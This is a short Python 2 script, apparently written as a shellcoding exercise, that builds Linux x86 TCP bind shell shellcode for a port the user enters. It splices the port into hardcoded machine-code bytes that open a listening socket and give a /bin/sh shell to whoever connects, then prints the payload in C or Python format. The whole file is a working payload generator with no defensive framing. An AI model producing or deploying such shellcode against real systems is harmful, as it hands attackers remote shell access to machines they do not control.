#!/usr/bin/python
# Filename: tcpBind.py
# Author:   boku

# Take users TCP port as input
port = raw_input("Enter TCP Port Number: ")
# Convert input string to an integer
deciPort = int(port)
# Format the integer to Hex Integer
hexPort = "{:02x}".format(deciPort)
#print "Hex value of Decimal Number:",hexPort
# Check the length of the output hex string
hexStrLen = len(hexPort)
# Check if the hex string is even or odd with modulus 2
oddEven = hexStrLen % 2
# if it returns 1 then it's odd. We need to add a leading 0
if oddEven == 1:
    hexPort = "0" + hexPort
    #print hexPort    # commented out. Used for debugging
# converts the  port number into the correct hex format
tcpPort = "\\x".join(hexPort[i:i+2] for i in range(0,len(hexPort), 2))
print "Your TCP Port in Hex is:","\\x"+tcpPort
nullCheck = deciPort % 256
if nullCheck == 0 :
    print "Your TCP Port contains a Null 0x00."
    print "Try again with a different Port Number."
    exit(0)
#print "\\x"+hexString   # debugging

scPart1 = "\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89"
scPart1 += "\xe1\xcd\x80\x96\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xd2\x52\x66\x68"
#Decimal 4444 = \x11\x5c = 0x115c # debugging
#tcpPort = "\x11\x5c"
scPart2 = "\x66\x53\x31\xc9\x89\xe1\x6a\x10\x51\x56\x89"
scPart2 += "\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x31\xc9\x51\x56"
scPart2 += "\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51"
scPart2 += "\x51\x56\x89\xe1\xcd\x80\x93\x31\xc0\x31\xc9\xb1\x02\xb0\x3f"
scPart2 += "\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
scPart2 += "\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"

# Initiate the Shellcode variable we will output
shellcode = ""

# Add the first part of the tcp bind shellcode
for x in bytearray(scPart1) :
    shellcode += '\\x'
    shellcode += '%02x' %x
# Add the user added tcp port to the shellcode
shellcode += "\\x"+tcpPort
# Add the second part of the tcp bind shellcode
for x in bytearray(scPart2) :
    shellcode += '\\x'
    shellcode += '%02x' %x

print "Choose your shellcode export format."
exportFormat = raw_input("[1] = C Format\n[2] = Python Format\n[1]: ")
if exportFormat == "2" : 
    formatSC = '"\nshellcode += "'.join(shellcode[i:i+48] for i in range(0,len(shellcode), 48))
    print "[-----------------------Your-Shellcode------------------------]"
    print 'shellcode = "'+formatSC+'"'
else :
    formatSC = '"\n"'.join(shellcode[i:i+48] for i in range(0,len(shellcode), 48))
    print "[----------------Your-Shellcode------------------]"
    print ' unsigned char shellcode[] = \\\n"'+formatSC+'";'
